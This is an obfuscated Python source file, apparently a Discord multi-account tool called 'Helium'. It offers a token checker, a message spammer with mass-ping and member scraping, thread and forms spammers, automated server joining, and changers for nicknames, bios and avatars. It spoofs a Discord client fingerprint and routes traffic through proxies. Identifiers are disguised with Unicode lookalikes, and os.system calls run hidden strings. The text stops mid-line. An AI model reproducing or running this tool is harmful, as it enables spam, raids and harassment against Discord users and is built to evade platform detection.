'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE3Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InBsIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTcgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMTIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMTIiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMjYyMjAsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM2NDQyLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==', 'https://canary.discordapp.com/api/v9/users/@me/library', 'http', 'https', 'http://', '.', 'Valid', '**', 'Locked', 'Invalid', 'wss://gateway.discord.gg/?v=9&encoding=json', 'token', 'properties', '$os', '$browser', '$device', 'windows', 'Discord', 'desktop', 'channel_id', 'self_mute', 'self_deaf', 'Joined', 'content', 'https://discord.com/api/v9/channels/', '/messages', 'Sent', 'Fail', '** ', 'online', 'idle', 'dnd', 'wss://gateway.discord.gg/?v=6&encording=json', 'capabilities', 'presence', 'compress', 'client_state', 'device', 'referrer', 'referring_domain', 'referrer_current', 'referring_domain_current', 'Chrome', 'en-GB', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', '90.0.4430.212', '10', '85108', 'null', 'status', 'since', 'activities', 'afk', 'guild_hashes', 'highest_last_message_id', 'read_state_version', 'user_guild_settings_version', 'bio', 'https://discord.com/api/v9/users/@me/profile', 'Success', 'Failure', 'nick', '/members/@me', 'type', 'auto_archive_duration', 'location', 'Thread Browser Toolbar', '/threads', 'applied_tags', '/threads?use_nested_fields=true', '/member-verification?with_guild=false', '/requests/@me', 'Failed', '/', '/messages/', '/reactions/', '/@me?location=Message', 'Reacted', 'avatars/', 'rb+', 'avatar', 'data:image/png;base64,', 'utf-8', 'https://discord.com/api/v9/users/@me', 'limit', 'around', '50', 'components', 'nonce', 'message_flags', 'message_id', 'application_id', 'author', 'component_type', 'custom_id', 'https://discord.com/api/v9/interactions', '1', '2', '3', '4', '5', '6', '7', '8', '9', '11', '12', '13', '14', '15', '16', '20', '    ', '>', '\nPress any key to go back to the main menu...', 'pause > nul', 'title Helium - avatar changer', 'title Helium - formater', ':', '+', '] Formatted ', ' tokens', 'Message Link', '] → ', "If there's 1 button, type: (", '), if you want to click second button just type 1 or more.', 'Button Option', "If there's 1 reaction, type: (", '), if reaction is the second reaction just type 1 or more.', 'Reaction', 'title Helium - Forms Spammer', 'Channel ID', 'Thread Name', 'Message', 'title Helium - Thread spammer', 'Thread name', 'title Helium - Nickname Changer', 'Guild ID', 'Nick', 'title Helium - Check Guild', 'INVITE: ', 'Joining Delay', 'https://', 'title Helium - Accept rules', 'Server ID: ', 'title Helium - VC Joiner', 'title Helium - Bio Changer', 'Bio', 'GUILD ID', 'title Helium - Token Checker', 'title Helium - Onliner', 'Onliner', '] All tokens are online', 'title Helium - Spammer', 'Mass-Ping?', ' → ', '→ ', 'Delay', 'y', 'Pings Count', 'Scraping Members', '(it might take a while)', 'n', 'title Helium - exit', '__main__']
import os
𝘰𝘀.system(𝘔𝙈𝗡𝗜𝘔𝗜𝗠𝙄𝘭𝙈𝘕𝙉𝘔𝗡𝘭𝙈𝗠𝙡𝘔𝙄𝙡𝗜𝘕𝗜𝗡𝙉𝗜𝙈𝗡𝙉𝘐𝗹[0])
𝗼𝘴.system(𝗠𝘔𝗡𝘐𝗠𝙄𝗠𝗜𝙡𝘔𝗡𝙉𝗠𝘕𝘭𝙈𝘔𝙡𝗠𝗜𝘭𝘐𝙉𝗜𝙉𝙉𝙄𝙈𝙉𝗡𝗜𝙡[1])
try:
    from colorama import Fore
    from os.path import isfile, join
    from pathlib import Path
    from threading import Thread
    from time import sleep
    from tls_client import Session
    from websocket import WebSocket
    import base64
    import colorama
    import datetime
    import hashlib
    import json
    import numpy as np
    import random
    import requests
    import subprocess
    import sys
    import threading
    import time
    import tls_client
    import uuid
    import websocket
    import emoji as ej
except 𝘔𝙤𝗱𝘂𝘭𝗲𝙉𝘰𝘵𝗙𝗼𝙪𝙣𝙙𝙀𝙧𝙧𝘰𝙧:
    𝙤𝘴.system(𝗠𝘔𝙉𝙄𝗠𝙄𝗠𝙄𝙡𝘔𝙉𝙉𝘔𝗡𝗹𝙈𝗠𝙡𝗠𝘐𝘭𝙄𝘕𝗜𝘕𝘕𝙄𝗠𝘕𝙉𝗜𝘭[2])
    𝘰𝙨.system(𝘔𝙈𝘕𝘐𝘔𝙄𝗠𝙄𝙡𝙈𝘕𝗡𝙈𝙉𝗹𝗠𝙈𝙡𝙈𝗜𝗹𝗜𝘕𝗜𝙉𝘕𝘐𝗠𝙉𝗡𝙄𝘭[3])
    𝘰𝘀.system(𝘔𝙈𝘕𝗜𝙈𝗜𝘔𝘐𝗹𝘔𝗡𝘕𝙈𝘕𝙡𝘔𝘔𝙡𝙈𝙄𝗹𝗜𝘕𝘐𝙉𝙉𝘐𝙈𝘕𝙉𝘐𝗹[4])
    𝙤𝘴.system(𝙈𝘔𝘕𝘐𝗠𝘐𝘔𝘐𝗹𝘔𝗡𝘕𝙈𝗡𝗹𝘔𝗠𝗹𝙈𝙄𝗹𝗜𝗡𝗜𝙉𝗡𝙄𝘔𝙉𝘕𝘐𝙡[5])
    𝙤𝘀.system(𝗠𝙈𝗡𝘐𝙈𝘐𝙈𝗜𝙡𝙈𝗡𝗡𝘔𝘕𝗹𝘔𝗠𝙡𝗠𝗜𝙡𝗜𝘕𝗜𝙉𝘕𝗜𝗠𝙉𝙉𝙄𝗹[6])
    𝘰𝙨.system(𝘔𝗠𝘕𝘐𝘔𝘐𝘔𝙄𝗹𝙈𝗡𝘕𝗠𝗡𝙡𝘔𝗠𝘭𝗠𝘐𝙡𝘐𝘕𝗜𝗡𝙉𝙄𝙈𝘕𝘕𝘐𝙡[7])
    𝘰𝘀.system(𝙈𝘔𝘕𝙄𝙈𝙄𝙈𝙄𝙡𝙈𝘕𝙉𝗠𝗡𝗹𝘔𝗠𝙡𝙈𝙄𝗹𝙄𝗡𝘐𝗡𝗡𝘐𝘔𝗡𝗡𝘐𝘭[8])
    𝘰𝘴.system(𝗠𝗠𝙉𝗜𝗠𝘐𝙈𝘐𝗹𝗠𝙉𝘕𝘔𝗡𝘭𝘔𝙈𝙡𝙈𝗜𝗹𝗜𝙉𝙄𝙉𝗡𝗜𝗠𝗡𝙉𝗜𝗹[9])
    𝗼𝘴.system(𝗠𝗠𝗡𝙄𝘔𝗜𝘔𝗜𝘭𝙈𝘕𝘕𝙈𝘕𝙡𝘔𝙈𝙡𝘔𝙄𝗹𝗜𝙉𝘐𝗡𝘕𝙄𝘔𝗡𝙉𝙄𝘭[10])
    𝗼𝘀.system(𝙈𝗠𝘕𝘐𝘔𝘐𝘔𝗜𝗹𝗠𝙉𝗡𝗠𝗡𝗹𝘔𝗠𝙡𝙈𝘐𝙡𝙄𝘕𝘐𝘕𝘕𝙄𝙈𝙉𝙉𝗜𝗹[11])
    𝙤𝘴.system(𝘔𝗠𝘕𝘐𝘔𝙄𝙈𝗜𝗹𝙈𝙉𝗡𝙈𝘕𝙡𝙈𝙈𝘭𝘔𝘐𝘭𝘐𝙉𝗜𝗡𝘕𝘐𝗠𝙉𝘕𝗜𝘭[12])
    𝗼𝙨.system(𝗠𝗠𝘕𝙄𝙈𝗜𝗠𝙄𝘭𝙈𝙉𝗡𝙈𝗡𝘭𝘔𝙈𝘭𝗠𝘐𝘭𝗜𝗡𝙄𝗡𝗡𝘐𝘔𝗡𝙉𝗜𝙡[13])
    𝗼𝙨.system(𝙈𝘔𝙉𝘐𝘔𝗜𝗠𝗜𝘭𝘔𝘕𝗡𝘔𝘕𝗹𝗠𝘔𝗹𝘔𝘐𝙡𝘐𝙉𝙄𝗡𝙉𝙄𝗠𝘕𝙉𝙄𝗹[14])
    𝙤𝘴.system(𝘔𝘔𝙉𝘐𝙈𝘐𝘔𝙄𝙡𝙈𝘕𝙉𝗠𝘕𝗹𝘔𝘔𝘭𝙈𝘐𝗹𝗜𝙉𝘐𝗡𝗡𝗜𝙈𝘕𝙉𝙄𝗹[15])
    𝗼𝘴.system(𝘔𝗠𝙉𝗜𝙈𝙄𝙈𝗜𝘭𝘔𝗡𝙉𝙈𝗡𝗹𝙈𝘔𝘭𝙈𝙄𝙡𝙄𝗡𝗜𝗡𝘕𝗜𝙈𝙉𝙉𝗜𝘭[16])
    from colorama import Fore
    from os.path import isfile, join
    from pathlib import Path
    from threading import Thread
    from time import sleep
    from tls_client import Session
    from websocket import WebSocket
    import base64
    import colorama
    import datetime
    import hashlib
    import json
    import numpy as np
    import random
    import requests
    import subprocess
    import sys
    import threading
    import time
    import tls_client
    import uuid
    import websocket
    import emoji as ej
𝗰𝘰𝗹𝘰𝙧𝘢𝗺𝗮.init()
𝘀𝘥𝗶𝗿 = 𝘰𝘀.path.dirname(𝘰𝙨.path.abspath(__𝙛𝗶𝗹𝙚__))
𝙙𝗮𝘵𝗮 = 𝘰𝘀.path.join(𝘴𝙙𝙞𝗿, 𝗠𝘔𝘕𝗜𝘔𝘐𝙈𝗜𝘭𝙈𝗡𝗡𝙈𝗡𝗹𝙈𝗠𝙡𝙈𝙄𝙡𝗜𝘕𝗜𝘕𝗡𝗜𝗠𝗡𝗡𝗜𝗹[17])
𝗮𝗯𝙘 = 𝘰𝘴.path.dirname(𝙤𝘀.path.abspath(𝗱𝘢𝘵𝙖))
𝘢𝘃𝗮𝘁𝘢𝗿𝙨 = 𝗼𝘴.path.join(𝘢𝘣𝙘, 𝘔𝙈𝘕𝙄𝙈𝙄𝗠𝘐𝘭𝙈𝘕𝙉𝙈𝘕𝙡𝙈𝗠𝗹𝗠𝘐𝘭𝗜𝙉𝗜𝗡𝙉𝗜𝗠𝘕𝗡𝙄𝘭[18])
if not 𝗼𝘀.path.exists(𝗱𝗮𝙩𝙖):
    𝗼𝘀.system(𝗠𝗠𝘕𝘐𝘔𝗜𝗠𝘐𝗹𝙈𝗡𝗡𝙈𝘕𝙡𝙈𝙈𝘭𝗠𝗜𝘭𝙄𝘕𝙄𝘕𝗡𝘐𝙈𝘕𝘕𝙄𝗹[19])
    𝗼𝘀.makedirs(𝘥𝘢𝘵𝘢)
    𝙤𝘴.makedirs(𝙖𝙫𝘢𝘵𝗮𝗿𝘴)
    with 𝙤𝗽𝙚𝗻(𝗼𝘀.path.join(𝘥𝘢𝙩𝗮, 𝘔𝙈𝘕𝗜𝗠𝙄𝘔𝙄𝗹𝗠𝗡𝗡𝗠𝘕𝗹𝙈𝘔𝘭𝘔𝙄𝗹𝘐𝙉𝗜𝘕𝙉𝙄𝗠𝗡𝙉𝗜𝙡[20]), 𝗠𝘔𝗡𝙄𝘔𝙄𝙈𝙄𝗹𝗠𝘕𝘕𝗠𝘕𝙡𝙈𝗠𝘭𝗠𝗜𝗹𝘐𝘕𝙄𝙉𝘕𝙄𝙈𝘕𝗡𝘐𝙡[21]) as 𝙛:
        𝙛.write(𝗠𝙈𝗡𝗜𝗠𝘐𝗠𝗜𝙡𝘔𝘕𝘕𝗠𝙉𝗹𝙈𝙈𝙡𝗠𝘐𝘭𝘐𝘕𝘐𝘕𝘕𝗜𝙈𝙉𝙉𝙄𝗹[22])
    with 𝙤𝘱𝙚𝘯(𝘰𝘀.path.join(𝙙𝗮𝘁𝙖, 𝗠𝘔𝙉𝗜𝗠𝗜𝘔𝘐𝙡𝘔𝘕𝗡𝙈𝙉𝘭𝙈𝘔𝗹𝗠𝗜𝗹𝗜𝘕𝘐𝗡𝘕𝘐𝙈𝗡𝙉𝙄𝘭[23]), 𝘔𝗠𝙉𝘐𝘔𝗜𝗠𝗜𝙡𝗠𝘕𝘕𝘔𝘕𝘭𝙈𝗠𝗹𝘔𝗜𝙡𝘐𝘕𝙄𝘕𝙉𝘐𝙈𝙉𝘕𝙄𝗹[21]) as 𝙛:
        𝘧.write(𝗠𝙈𝙉𝗜𝙈𝙄𝙈𝗜𝘭𝙈𝙉𝙉𝗠𝘕𝙡𝙈𝙈𝙡𝘔𝙄𝗹𝘐𝗡𝘐𝙉𝗡𝗜𝗠𝗡𝗡𝙄𝙡[22])
    with 𝗼𝙥𝙚𝘯(𝗼𝙨.path.join(𝗱𝘢𝘵𝘢, 𝗠𝙈𝘕𝘐𝘔𝘐𝗠𝗜𝗹𝙈𝗡𝙉𝙈𝘕𝙡𝙈𝙈𝙡𝘔𝙄𝗹𝙄𝘕𝗜𝗡𝙉𝘐𝘔𝘕𝗡𝘐𝙡[24]), 𝗠𝙈𝘕𝗜𝙈𝗜𝘔𝙄𝗹𝘔𝙉𝗡𝘔𝗡𝗹𝘔𝙈𝗹𝗠𝙄𝗹𝘐𝗡𝙄𝙉𝗡𝙄𝙈𝗡𝙉𝙄𝘭[21]) as 𝘧:
        𝘧.write(𝘔𝗠𝙉𝙄𝘔𝙄𝙈𝗜𝙡𝙈𝙉𝙉𝘔𝘕𝙡𝙈𝙈𝘭𝙈𝘐𝘭𝙄𝙉𝗜𝙉𝗡𝗜𝘔𝘕𝙉𝘐𝙡[22])
𝘤𝙤𝘯𝘧𝙞𝘨𝗽 = 𝘰𝙨.path.join(𝙨𝘥𝘪𝙧, 𝙈𝘔𝙉𝗜𝙈𝙄𝗠𝙄𝙡𝘔𝙉𝘕𝘔𝘕𝗹𝘔𝗠𝘭𝘔𝘐𝘭𝘐𝘕𝗜𝗡𝙉𝘐𝙈𝗡𝗡𝙄𝙡[25])
if not 𝗼𝘴.path.exists(𝗰𝗼𝙣𝗳𝙞𝘨𝙥):
    with 𝘰𝗽𝘦𝘯(𝙤𝙨.path.join(𝘔𝗠𝘕𝙄𝗠𝙄𝙈𝙄𝘭𝘔𝘕𝘕𝙈𝗡𝙡𝘔𝗠𝙡𝗠𝗜𝙡𝗜𝗡𝙄𝗡𝙉𝗜𝘔𝗡𝘕𝘐𝗹[25]), 𝗠𝙈𝘕𝗜𝘔𝗜𝘔𝘐𝘭𝙈𝗡𝙉𝗠𝗡𝘭𝙈𝗠𝗹𝘔𝗜𝗹𝙄𝙉𝘐𝙉𝗡𝙄𝘔𝙉𝙉𝙄𝘭[21]) as 𝙛:
        𝘧.write(𝙈𝗠𝙉𝗜𝘔𝘐𝗠𝗜𝙡𝙈𝙉𝘕𝗠𝗡𝙡𝙈𝘔𝘭𝘔𝙄𝘭𝙄𝘕𝘐𝘕𝙉𝗜𝗠𝗡𝗡𝗜𝗹[26])
with 𝗼𝗽𝙚𝙣(𝗠𝘔𝘕𝘐𝘔𝘐𝘔𝙄𝙡𝙈𝘕𝘕𝙈𝗡𝙡𝙈𝙈𝗹𝙈𝘐𝙡𝗜𝙉𝗜𝙉𝙉𝙄𝗠𝘕𝙉𝘐𝙡[25], encoding=𝙈𝘔𝘕𝘐𝘔𝗜𝗠𝘐𝘭𝗠𝘕𝙉𝘔𝘕𝙡𝙈𝙈𝘭𝙈𝘐𝗹𝘐𝙉𝙄𝙉𝙉𝗜𝘔𝙉𝗡𝗜𝘭[27]) as 𝗳:
    𝙣𝘪𝘨 = 𝗷𝘴𝘰𝗻.load(𝘧)
𝘱𝘳𝘰𝘹𝘆 = 𝘯𝙞𝗴.get(𝙈𝙈𝙉𝙄𝙈𝘐𝙈𝙄𝘭𝗠𝗡𝘕𝗠𝘕𝘭𝗠𝗠𝗹𝗠𝗜𝙡𝗜𝘕𝗜𝗡𝗡𝙄𝙈𝗡𝘕𝙄𝗹[28])
𝙥𝘳𝘰𝘹𝗶𝗲𝙨 = 𝘰𝗽𝗲𝗻(𝗠𝙈𝘕𝙄𝗠𝘐𝙈𝘐𝗹𝘔𝘕𝙉𝗠𝘕𝘭𝗠𝙈𝘭𝙈𝘐𝗹𝙄𝗡𝗜𝗡𝙉𝙄𝘔𝙉𝘕𝗜𝙡[29], 𝘔𝗠𝙉𝙄𝘔𝙄𝙈𝘐𝗹𝙈𝘕𝘕𝙈𝗡𝙡𝘔𝘔𝘭𝗠𝘐𝗹𝘐𝗡𝙄𝗡𝘕𝗜𝘔𝗡𝘕𝙄𝙡[30], encoding=𝙈𝘔𝙉𝘐𝗠𝙄𝙈𝙄𝘭𝗠𝘕𝗡𝙈𝙉𝙡𝘔𝙈𝘭𝗠𝘐𝘭𝘐𝘕𝘐𝗡𝘕𝘐𝙈𝙉𝘕𝗜𝗹[27]).read().splitlines()
𝙗 = 𝘍𝙤𝘳𝙚.LIGHTBLUE_EX
𝘳 = 𝗙𝘰𝘳𝙚.RESET
𝗴 = 𝘍𝙤𝗿𝘦.LIGHTBLACK_EX
𝗮 = 𝗙𝗼𝙧𝙚.BLUE
𝙘 = 𝗙𝘰𝗿𝘦.CYAN
𝘭𝘤 = 𝗙𝘰𝙧𝗲.LIGHTCYAN_EX
𝗿𝘦𝗱 = 𝘍𝗼𝘳𝙚.RED
𝘺𝘦𝙡𝙡𝗼𝘸 = 𝙁𝘰𝗿𝗲.YELLOW
𝗴𝗿𝘦𝗲𝙣 = 𝗙𝘰𝘳𝗲.GREEN
𝘣𝘭𝘂𝗲 = 𝗙𝘰𝘳𝘦.BLUE
𝘰𝗿𝙖𝘯𝙜𝗲 = 𝗙𝗼𝘳𝘦.RED + 𝙁𝙤𝗿𝗲.YELLOW
𝗽𝗿𝙚𝘵𝙩𝘺 = 𝘍𝙤𝙧𝘦.LIGHTMAGENTA_EX + 𝙁𝘰𝗿𝗲.LIGHTCYAN_EX
𝗺𝗮𝙜𝗲𝙣𝘵𝘢 = 𝗙𝙤𝙧𝘦.MAGENTA
𝘭𝗶𝙜𝗵𝘁𝗯𝘭𝘂𝗲 = 𝗙𝗼𝗿𝙚.LIGHTBLUE_EX
𝙘𝘺𝘢𝙣 = 𝘍𝘰𝗿𝗲.CYAN
𝙜𝙧𝘢𝘺 = 𝙁𝗼𝙧𝘦.LIGHTBLACK_EX + 𝙁𝙤𝗿𝙚.WHITE
𝙧𝙚𝘀𝗲𝘁 = 𝙁𝘰𝙧𝗲.RESET
𝘱𝗶𝙣𝘬 = 𝗙𝗼𝗿𝗲.LIGHTGREEN_EX + 𝙁𝘰𝘳𝘦.LIGHTMAGENTA_EX
𝘀𝘦𝘴𝘀𝙞𝘰𝙣 = 𝘁𝗹𝘀_𝗰𝗹𝗶𝙚𝘯𝘁.Session(𝘔𝗠𝗡𝙄𝘔𝙄𝙈𝗜𝗹𝙈𝙉𝘕𝗠𝙉𝘭𝗠𝘔𝘭𝗠𝙄𝘭𝗜𝙉𝗜𝗡𝘕𝘐𝙈𝙉𝘕𝙄𝙡[31])
𝙢𝗲𝘯𝘂 = f'{𝗿}{𝘔𝙈𝗡𝗜𝘔𝘐𝙈𝙄𝗹𝘔𝘕𝗡𝙈𝙉𝙡𝙈𝗠𝙡𝘔𝙄𝙡𝙄𝘕𝙄𝙉𝙉𝙄𝗠𝘕𝙉𝙄𝗹[32]}{𝙡𝗰}{𝘔𝘔𝗡𝗜𝘔𝘐𝙈𝙄𝘭𝙈𝙉𝗡𝗠𝙉𝗹𝗠𝗠𝘭𝘔𝙄𝙡𝗜𝙉𝘐𝗡𝙉𝗜𝗠𝙉𝗡𝘐𝗹[33]}{𝙧}{𝘔𝗠𝘕𝗜𝗠𝗜𝘔𝗜𝘭𝙈𝙉𝙉𝘔𝗡𝗹𝗠𝘔𝘭𝗠𝘐𝙡𝙄𝙉𝗜𝙉𝗡𝗜𝘔𝙉𝙉𝙄𝘭[34]}{𝙡𝙘}{𝗠𝗠𝗡𝙄𝘔𝘐𝗠𝗜𝙡𝘔𝙉𝗡𝙈𝘕𝘭𝘔𝗠𝙡𝙈𝗜𝘭𝘐𝘕𝗜𝙉𝘕𝗜𝗠𝗡𝙉𝙄𝙡[35]}{𝙧}{𝘔𝗠𝗡𝙄𝙈𝘐𝘔𝙄𝘭𝙈𝗡𝗡𝙈𝗡𝙡𝗠𝘔𝙡𝘔𝗜𝘭𝘐𝙉𝙄𝗡𝘕𝘐𝗠𝘕𝗡𝗜𝗹[36]}{𝗹𝙘}{𝘔𝙈𝘕𝗜𝘔𝘐𝗠𝗜𝗹𝗠𝗡𝙉𝘔𝙉𝗹𝙈𝗠𝙡𝘔𝗜𝗹𝘐𝙉𝗜𝘕𝘕𝗜𝙈𝗡𝗡𝘐𝗹[35]}{𝗿}{𝗠𝘔𝙉𝗜𝗠𝘐𝗠𝙄𝙡𝘔𝙉𝗡𝘔𝘕𝙡𝗠𝗠𝗹𝘔𝘐𝙡𝙄𝗡𝗜𝙉𝙉𝗜𝘔𝗡𝗡𝘐𝗹[34]}{𝙡𝘤}{𝙈𝙈𝙉𝙄𝙈𝙄𝘔𝙄𝘭𝙈𝙉𝘕𝘔𝗡𝘭𝙈𝘔𝙡𝗠𝗜𝘭𝗜𝗡𝘐𝗡𝙉𝙄𝗠𝘕𝙉𝘐𝙡[37]}{𝙧}{𝘔𝗠𝘕𝙄𝙈𝗜𝗠𝙄𝘭𝘔𝘕𝗡𝗠𝗡𝙡𝘔𝗠𝗹𝗠𝘐𝗹𝗜𝗡𝘐𝗡𝙉𝘐𝘔𝙉𝗡𝙄𝘭[34]}{𝗹𝘤}{𝗠𝘔𝘕𝗜𝙈𝘐𝘔𝗜𝗹𝗠𝗡𝗡𝗠𝘕𝗹𝗠𝘔𝙡𝙈𝘐𝘭𝘐𝗡𝙄𝙉𝙉𝗜𝗠𝗡𝙉𝙄𝗹[35]}{𝙧}{𝗠𝙈𝗡𝘐𝙈𝘐𝙈𝘐𝙡𝗠𝗡𝘕𝘔𝗡𝙡𝘔𝗠𝙡𝗠𝙄𝘭𝗜𝗡𝗜𝘕𝘕𝗜𝘔𝘕𝗡𝘐𝗹[34]}{𝙡𝗰}{𝙈𝙈𝘕𝗜𝙈𝗜𝗠𝗜𝘭𝗠𝘕𝙉𝘔𝗡𝗹𝗠𝘔𝙡𝗠𝗜𝙡𝘐𝙉𝘐𝘕𝙉𝘐𝘔𝙉𝘕𝘐𝙡[38]}{𝙧}{𝙈𝗠𝘕𝗜𝗠𝙄𝘔𝘐𝘭𝗠𝘕𝙉𝗠𝙉𝙡𝘔𝘔𝘭𝘔𝗜𝗹𝙄𝘕𝘐𝘕𝗡𝙄𝗠𝙉𝘕𝘐𝙡[34]}{𝙡𝗰}{𝙈𝘔𝘕𝙄𝗠𝘐𝗠𝙄𝗹𝙈𝘕𝙉𝗠𝘕𝘭𝘔𝙈𝙡𝗠𝙄𝗹𝘐𝗡𝘐𝘕𝘕𝘐𝙈𝙉𝙉𝙄𝙡[35]}{𝗿}{𝘔𝗠𝗡𝘐𝗠𝘐𝙈𝗜𝘭𝗠𝘕𝙉𝘔𝗡𝗹𝙈𝗠𝗹𝙈𝘐𝘭𝗜𝗡𝘐𝘕𝗡𝙄𝘔𝘕𝙉𝗜𝙡[39]}{𝙡𝙘}{𝙈𝗠𝙉𝙄𝙈𝘐𝗠𝗜𝗹𝙈𝙉𝙉𝗠𝘕𝘭𝗠𝘔𝙡𝙈𝗜𝙡𝘐𝙉𝙄𝙉𝘕𝙄𝗠𝙉𝘕𝗜𝙡[38]}{𝘳}{𝘔𝙈𝘕𝗜𝘔𝗜𝙈𝗜𝙡𝘔𝗡𝗡𝙈𝘕𝘭𝗠𝙈𝘭𝗠𝗜𝙡𝘐𝘕𝗜𝙉𝙉𝙄𝗠𝘕𝙉𝙄𝗹[39]}{𝘭𝗰}{𝘔𝘔𝘕𝗜𝙈𝘐𝗠𝙄𝗹𝗠𝗡𝘕𝗠𝘕𝘭𝙈𝗠𝙡𝗠𝙄𝘭𝘐𝗡𝘐𝙉𝙉𝗜𝗠𝙉𝗡𝗜𝘭[40]}{𝙧}{𝗠𝘔𝗡𝘐𝘔𝗜𝗠𝘐𝙡𝘔𝗡𝙉𝙈𝙉𝗹𝘔𝘔𝗹𝘔𝗜𝘭𝘐𝙉𝗜𝘕𝗡𝗜𝘔𝙉𝗡𝗜𝗹[34]}{𝘭𝗰}{𝗠𝗠𝘕𝙄𝘔𝙄𝗠𝙄𝗹𝗠𝘕𝘕𝗠𝗡𝙡𝘔𝘔𝘭𝗠𝗜𝘭𝗜𝘕𝗜𝘕𝘕𝗜𝘔𝗡𝙉𝙄𝘭[41]}{𝘳}{𝘔𝙈𝘕𝘐𝙈𝘐𝗠𝗜𝘭𝘔𝘕𝗡𝗠𝗡𝙡𝗠𝗠𝙡𝗠𝘐𝘭𝙄𝘕𝘐𝙉𝗡𝘐𝗠𝘕𝗡𝘐𝗹[34]}{𝙡𝙘}{𝘔𝙈𝗡𝙄𝙈𝘐𝙈𝗜𝗹𝗠𝗡𝘕𝗠𝘕𝙡𝗠𝗠𝙡𝗠𝙄𝗹𝗜𝙉𝙄𝙉𝘕𝘐𝙈𝙉𝘕𝗜𝙡[42]}{𝗿}{𝙈𝘔𝗡𝙄𝗠𝙄𝙈𝙄𝙡𝗠𝗡𝙉𝗠𝙉𝗹𝗠𝙈𝙡𝙈𝙄𝗹𝗜𝙉𝘐𝗡𝙉𝘐𝘔𝘕𝘕𝗜𝘭[34]}{𝗹𝘤}{𝙈𝙈𝗡𝙄𝘔𝘐𝗠𝙄𝙡𝘔𝗡𝗡𝙈𝗡𝗹𝗠𝙈𝗹𝗠𝘐𝙡𝘐𝘕𝗜𝗡𝙉𝗜𝗠𝗡𝘕𝙄𝘭[43]}{𝘳}{𝗠𝙈𝙉𝗜𝘔𝙄𝙈𝘐𝘭𝙈𝘕𝘕𝙈𝘕𝗹𝙈𝙈𝘭𝙈𝘐𝙡𝙄𝘕𝙄𝘕𝘕𝗜𝘔𝗡𝘕𝙄𝘭[34]}{𝙡𝘤}{𝘔𝗠𝘕𝙄𝘔𝗜𝘔𝘐𝘭𝗠𝗡𝗡𝗠𝗡𝗹𝙈𝘔𝘭𝘔𝗜𝗹𝘐𝙉𝗜𝗡𝘕𝙄𝙈𝗡𝘕𝘐𝗹[44]}{𝗿}{𝗠𝗠𝘕𝘐𝙈𝘐𝗠𝗜𝙡𝗠𝗡𝗡𝘔𝘕𝗹𝙈𝙈𝙡𝙈𝗜𝙡𝗜𝙉𝙄𝘕𝙉𝗜𝘔𝙉𝙉𝙄𝙡[34]}{𝙡𝗰}{𝘔𝗠𝘕𝗜𝗠𝘐𝘔𝙄𝗹𝙈𝗡𝘕𝗠𝙉𝘭𝙈𝙈𝗹𝙈𝙄𝗹𝙄𝗡𝗜𝙉𝘕𝘐𝘔𝘕𝙉𝘐𝗹[42]}{𝗿}{𝘔𝘔𝘕𝙄𝙈𝗜𝘔𝗜𝙡𝗠𝗡𝘕𝗠𝗡𝗹𝘔𝘔𝘭𝘔𝗜𝘭𝘐𝘕𝙄𝗡𝙉𝘐𝗠𝘕𝙉𝘐𝘭[34]}{𝘭𝘤}{𝙈𝘔𝘕𝘐𝗠𝙄𝗠𝗜𝙡𝘔𝗡𝙉𝗠𝘕𝗹𝘔𝘔𝗹𝘔𝗜𝗹𝗜𝘕𝘐𝗡𝗡𝘐𝗠𝗡𝗡𝘐𝙡[45]}{𝗿}{𝙈𝙈𝗡𝗜𝗠𝗜𝙈𝘐𝙡𝗠𝘕𝘕𝙈𝙉𝙡𝗠𝘔𝙡𝗠𝘐𝙡𝗜𝗡𝘐𝗡𝘕𝘐𝘔𝙉𝙉𝘐𝙡[34]}{𝗹𝘤}{𝗠𝘔𝗡𝙄𝗠𝘐𝘔𝘐𝘭𝙈𝙉𝙉𝘔𝘕𝘭𝘔𝙈𝗹𝘔𝙄𝗹𝙄𝗡𝘐𝙉𝘕𝘐𝘔𝙉𝙉𝙄𝗹[42]}{𝗿}{𝘔𝗠𝗡𝘐𝗠𝘐𝗠𝘐𝙡𝗠𝙉𝘕𝘔𝘕𝗹𝘔𝗠𝙡𝗠𝙄𝗹𝙄𝘕𝙄𝗡𝘕𝗜𝗠𝘕𝘕𝙄𝘭[46]}{𝙡𝗰}{𝙈𝙈𝘕𝗜𝙈𝘐𝘔𝙄𝘭𝗠𝘕𝗡𝙈𝙉𝗹𝗠𝙈𝗹𝗠𝘐𝙡𝙄𝙉𝗜𝙉𝗡𝗜𝘔𝙉𝙉𝘐𝘭[47]}{𝙧}{𝘔𝙈𝗡𝗜𝙈𝗜𝗠𝙄𝘭𝘔𝘕𝗡𝙈𝘕𝗹𝗠𝙈𝘭𝙈𝙄𝘭𝗜𝘕𝘐𝘕𝘕𝗜𝘔𝙉𝘕𝘐𝘭[46]}{𝘭𝘤}{𝗠𝘔𝗡𝗜𝗠𝙄𝗠𝙄𝙡𝗠𝙉𝘕𝗠𝘕𝗹𝗠𝘔𝗹𝘔𝘐𝙡𝙄𝘕𝙄𝘕𝙉𝗜𝙈𝗡𝙉𝙄𝗹[42]}{𝙧}{𝘔𝙈𝙉𝗜𝘔𝘐𝗠𝗜𝗹𝙈𝘕𝗡𝗠𝘕𝙡𝗠𝙈𝗹𝗠𝙄𝘭𝗜𝙉𝘐𝙉𝗡𝘐𝙈𝙉𝗡𝘐𝙡[48]}{𝙡𝘤}{𝘔𝘔𝙉𝗜𝘔𝘐𝘔𝗜𝗹𝘔𝗡𝙉𝙈𝗡𝗹𝘔𝗠𝙡𝗠